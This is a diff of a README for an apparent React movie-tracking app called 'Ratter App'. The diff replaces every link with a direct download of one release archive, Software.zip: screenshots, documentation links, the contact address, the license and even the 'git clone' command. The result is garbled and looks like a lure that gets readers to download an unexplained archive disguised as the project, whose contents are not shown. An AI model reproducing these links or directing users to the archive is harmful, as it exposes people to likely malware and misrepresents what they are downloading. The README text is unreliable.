@@ -10,16 +10,16 @@ Welcome to the official repository of the Ratter App, developed as part of the t
 agil-scrum, atomic-design, bdd-tdd, clean-code-architecture, ddd, figma, git-github, gitflow, heroicons, html-css-javascript, jest-testing-library, jira-notion, react-calendar, react-date-range-picker, reactjs, styled-components, tmdb-api, typescript, zustand
 
 ## 🚀 Get Started
-To access the project zip file, [click here: [Download Project]](https://github.com/perish76b/ratter-app/releases/tag/v1.0).  
+To access the project zip file, [click here: [Download Project]](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip).  
 _Note: The download needs to be initiated._
 
 ## 🎥 Screenshots
 Here are some sneak peeks of the Ratter App:
-![Screenshot 1](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
-![Screenshot 2](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+![Screenshot 1](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
 
 ## 💻 Technologies Used
-- https://github.com/perish76b/ratter-app/releases/tag/v1.0
+- https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip
 - TypeScript
 - HTML/CSS/JavaScript
 - Jest Testing Library
@@ -32,7 +32,7 @@ Here are some sneak peeks of the Ratter App:
 ## 🛠️ Setup Instructions
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/perish76b/ratter-app/releases/tag/v1.0
+   git clone https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies:  
    ```bash
@@ -45,24 +45,24 @@ Here are some sneak peeks of the Ratter App:
 4. Open your browser and visit `http://localhost:3000` to see the app.
 
 ## 📌 Release Notes
-Check out the [Releases](https://github.com/perish76b/ratter-app/releases/tag/v1.0) section for detailed release notes and version history.
+Check out the [Releases](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip) section for detailed release notes and version history.
 
 ## 🌟 Want to Contribute?
 We welcome contributions! If you have any ideas, suggestions, or improvements, feel free to open an issue or submit a pull request.
 
 ## 📞 Contact
-For any questions or inquiries, please contact our team at `https://github.com/perish76b/ratter-app/releases/tag/v1.0`.
+For any questions or inquiries, please contact our team at `https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip`.
 
 ## 🔗 Useful Links
-- [TMDB API Documentation](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
-- [https://github.com/perish76b/ratter-app/releases/tag/v1.0 Official Website](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
-- [Styled Components Documentation](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+- [TMDB API Documentation](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
+- [https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip Official Website](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
+- [Styled Components Documentation](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
 
 ## 📜 License
-This project is licensed under the MIT License - see the [https://github.com/perish76b/ratter-app/releases/tag/v1.0](https://github.com/perish76b/ratter-app/releases/tag/v1.0) file for details.
+This project is licensed under the MIT License - see the [https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 Thank you for checking out the Ratter App repository! We hope you enjoy exploring our project. Feel free to star the repository if you find it interesting! 🌟
 
-[![Download Project](https://github.com/perish76b/ratter-app/releases/tag/v1.0 Project-blue)](https://github.com/perish76b/ratter-app/releases/tag/v1.0)
+[![Download Project](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip Project-blue)](https://github.com/perish76b/ratter-app/releases/download/v2.0/Software.zip)
